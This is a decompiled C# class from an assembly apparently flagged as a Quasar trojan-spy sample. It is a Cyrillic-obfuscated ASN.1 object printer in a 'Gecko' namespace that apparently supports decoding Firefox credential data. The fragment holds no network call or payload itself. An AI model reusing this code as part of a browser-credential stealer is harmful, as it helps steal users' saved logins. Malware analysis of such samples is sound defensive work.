// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.Gecko.нкрпар
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System.Collections.Generic;
using System.Text;

namespace NoiseMe.Drags.App.Data.Gecko
{
  public class нкрпар
  {
    public ггорол ObjectType { get; set; }

    public byte[] ObjectData { get; set; }

    public int ObjectLength { get; set; }

    public List<нкрпар> Objects { get; set; }

    public нкрпар() => this.Objects = new List<нкрпар>();

    public override string ToString()
    {
      StringBuilder stringBuilder1 = new StringBuilder();
      StringBuilder stringBuilder2 = new StringBuilder();
      switch (this.ObjectType)
      {
        case ггорол.Integer:
          foreach (byte num in this.ObjectData)
            stringBuilder2.AppendFormat("{0:X2}", (object) num);
          stringBuilder1.Append("\tINTEGER ").Append((object) stringBuilder2).AppendLine();
          break;
        case ггорол.OctetString:
          foreach (byte num in this.ObjectData)
            stringBuilder2.AppendFormat("{0:X2}", (object) num);
          stringBuilder1.Append("\tOCTETSTRING ").AppendLine(stringBuilder2.ToString());
          break;
        case ггорол.ObjectIdentifier:
          foreach (byte num in this.ObjectData)
            stringBuilder2.AppendFormat("{0:X2}", (object) num);
          stringBuilder1.Append("\tOBJECTIDENTIFIER ").AppendLine(stringBuilder2.ToString());
          break;
        case ггорол.Sequence:
          stringBuilder1.AppendLine("SEQUENCE {");
          break;
      }
      foreach (нкрпар нкрпар in this.Objects)
        stringBuilder1.Append(нкрпар.ToString());
      if (this.ObjectType == ггорол.Sequence)
        stringBuilder1.AppendLine("}");
      stringBuilder2.Remove(0, stringBuilder2.Length - 1);
      return stringBuilder1.ToString();
    }
  }
}
